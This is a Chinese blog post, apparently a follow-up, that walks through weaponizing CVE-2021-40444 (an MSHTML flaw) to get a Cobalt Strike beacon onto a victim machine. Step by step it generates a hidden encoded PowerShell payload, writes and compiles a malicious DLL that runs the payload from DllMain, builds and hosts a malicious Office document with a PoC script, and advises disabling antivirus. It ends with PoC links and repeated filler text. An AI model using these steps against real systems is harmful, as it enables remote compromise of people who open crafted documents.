> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Lr4u0cVeOt05e6YSAQMvJw)

上一篇的地址：

[CVE-2021-40444 MSHTML 组件漏洞 | 附: 实现过程](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247485006&idx=1&sn=6b8bc9e32777f6a7f5853a6fc7750827&chksm=e9aa1b8cdedd929a3a4e28f281fea6e4647463c86605c591310852bba71ca928ed7a37156ae8&scene=21#wechat_redirect)  

### 以下是上一篇的一些补充

### CS 上线方法：

下载编译工具：

```
1sudo apt-get install gcc-mingw-w64
```

启动 CS 客户端和服务端, 然后生成 payload

```
1powershell -nop -w hidden -encodedcommand  .....(忽略)
```

构造源文件

```
1#include <windows.h> 2 3void exec(void) { 4system("powershell -nop -w hidden -encodedcommand  .....(忽略)"); 5return; 6} 7 8BOOL WINAPI DllMain( 9   HINSTANCE hinstDLL,10   DWORD fdwReason,11   LPVOID lpReserved )12{13   switch( fdwReason )14  {15       case DLL_PROCESS_ATTACH:16          exec();17          break;1819       case DLL_THREAD_ATTACH:20           break;2122       case DLL_THREAD_DETACH:23           break;2425       case DLL_PROCESS_DETACH:26           break;27  }28   return TRUE;29}
```

编译生成生成 dll

```
1i686-w64-mingw32-gcc -shared calc.c -o calc.dll
```

生成恶意文档

```
1python3 exploit.py generate test/calc.dll http://192.168.226.128
```

生产服务端

```
1sudo python3 exploit.py host 80
```

在虚拟机里打开生产的恶意文档 成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MVuErASoOaKrIicsZsbcVo7aosSFo9dJyNzp1cFSocia5NCTuojvFiadg5LcVc3yYFVF0eW2ZwfWC2Iw/640?wx_fmt=png)

  

### 复现注意事项

1.  IE 浏览器要启用 ActiveX
    
2.  注意防病毒要关闭
    

### 相关链接

https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/

https://github.com/rfcxv/CVE-2021-40444-POC

https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A

凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数